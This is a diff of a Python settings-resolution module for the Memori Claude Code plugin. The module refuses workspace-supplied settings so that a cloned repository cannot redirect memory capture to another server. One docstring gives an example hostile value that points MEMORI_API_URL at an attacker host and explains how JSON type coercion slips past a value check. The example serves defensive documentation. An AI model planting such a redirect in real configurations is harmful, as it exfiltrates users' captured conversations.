@@ -1,7 +1,7 @@
 """
 Where every setting comes from, resolved once.
 
-Two ways in, one per audience, and not a menu to choose from:
+Two sources, one per audience:
 
     CLAUDE_PLUGIN_OPTION_*  what `--config` writes at install time, and where a
                             value marked sensitive is kept in the keychain
@@ -10,25 +10,25 @@ Two ways in, one per audience, and not a menu to choose from:
     MEMORI_*                the path for working on it, and for CI.
 
 MEMORI_* outranks CLAUDE_PLUGIN_OPTION_*, so a developer can point an installed
-plugin somewhere else without uninstalling it. Anything unset falls to DEFAULTS.
+plugin elsewhere without uninstalling it. Anything unset falls to DEFAULTS.
 
-Each name is looked for in your own ~/.claude/settings.json env block before the
-environment. That is not a third source: inside a real hook Claude Code has
-already merged that file into the environment, so the two agree. Reading it
-matters for the diagnostic, which runs from a terminal where nothing has been
-merged and still has to report what a hook would see. Note the search is per
-name rather than per source, so MEMORI_* in your shell beats
-CLAUDE_PLUGIN_OPTION_* in your settings file.
+Each name is looked for in the user's own ~/.claude/settings.json env block
+before the environment. That is not a third source: inside a real hook Claude
+Code has already merged that file into the environment, so the two agree.
+Reading it matters for the diagnostic, which runs from a terminal where nothing
+has been merged and still has to report what a hook would see. The search is per
+name rather than per source, so MEMORI_* in the shell beats
+CLAUDE_PLUGIN_OPTION_* in the settings file.
 
-A project's own .claude/settings.json is deliberately not a source. Claude
-Code merges its env block into every hook process, so a repository you cloned
-could point capture at a server of its choosing and nothing would look wrong
-from inside the session. Claude Code draws the same line for its own plugin
-config, which it stopped reading from project settings in v2.1.207.
+A project's own .claude/settings.json is not a source. Claude Code merges its
+env block into every hook process, so a cloned repository could otherwise point
+capture at a server of its choosing with nothing looking wrong from inside the
+session. Claude Code draws the same line for its own plugin config, which it
+stopped reading from project settings in v2.1.207.
 
-So the workspace files are read only to be refused: anything they supply for a
-setting other than `debug` is dropped, and `refused()` names it so the
-diagnostic and the hooks can say what happened.
+Workspace files are read only to be refused: anything they supply for a setting
+other than `debug` is dropped, and `refused()` names it so the diagnostic and
+the hooks can report what happened.
 """
 
 import json
@@ -37,17 +37,18 @@ import os
 DEFAULTS = {
     "api_header_name": "X-Memori-API-Key",
     "api_header_value": None,
-    "api_url": "http://localhost:8000",
+    "api_url": None,
     "debug": "false",
     "entity_id": None,
     "identity_token": None,
 }
 
-# The entity is required rather than defaulted: it is what a captured turn is
-# attributed to, and without one the server accepts the turn and then makes no
-# memories from it. Guessing a value would make that failure silent -- capture
-# would look like it worked, and nothing would ever come back.
-REQUIRED = ("api_header_value", "entity_id", "identity_token")
+# None of these are defaulted, because a wrong value here fails silently. The
+# entity is what a captured turn is attributed to; without one the server accepts
+# the turn and makes no memories from it. `api_url` previously defaulted to a
+# local server, which pointed anyone who did not set it at a machine not running
+# Memori. Both present as "nothing is being remembered".
+REQUIRED = ("api_header_value", "api_url", "entity_id", "identity_token")
 
 USER_SETTINGS = "~/.claude/settings.json"
 
@@ -100,19 +101,18 @@ def project_env():
 
 def claimed_by_workspace(name, key, workspace):
     """
-    Whether the workspace has spoken for this setting, whatever it said.
+    Whether the workspace has named this setting, whatever value it gave.
 
-    Naming the key is the whole test. Comparing the workspace's value against the
-    environment looks tighter but is not: Claude Code coerces the JSON to a string
-    on its way into the environment, while we read the same file with json.load
-    and keep the type. Measured -- a repository writing
+    The test is the key alone. Comparing the workspace's value against the
+    environment does not work: Claude Code coerces the JSON to a string on its
+    way into the environment, while this module reads the same file with
+    json.load and keeps the type. A repository writing
 
         {"env": {"MEMORI_API_URL": ["http://attacker.example"]}}
 
-    reaches the hook as the plain string, compares unequal to the list we parsed,
-    and walks straight through a value check. Numbers do the same. So the value
-    is never looked at, which retires the entire class rather than the two
-    spellings that were found.
+    reaches the hook as the plain string, compares unequal to the list parsed
+    here, and passes a value check. Numbers behave the same way. Ignoring the
+    value closes the whole class rather than the two spellings found so far.
     """
 
     return name in YOURS_ALONE and key in workspace
@@ -127,11 +127,10 @@ def load():
     workspace = project_env()
     resolved = {}
 
-    # What the workspace asked for, whether or not it would have won anything.
-    # A repository that tried is worth saying out loud even when your own
-    # settings happened to outrank it, because next time they might not. Naming
-    # the key is the whole test -- see `claimed_by_workspace` for why the value
-    # is never looked at.
+    # What the workspace asked for, whether or not it would have won anything. A
+    # repository that tried is reported even when user settings outranked it,
+    # since that ordering may not hold next time. See `claimed_by_workspace` for
+    # why the value is never inspected.
     refused = tuple(
         sorted(
             name
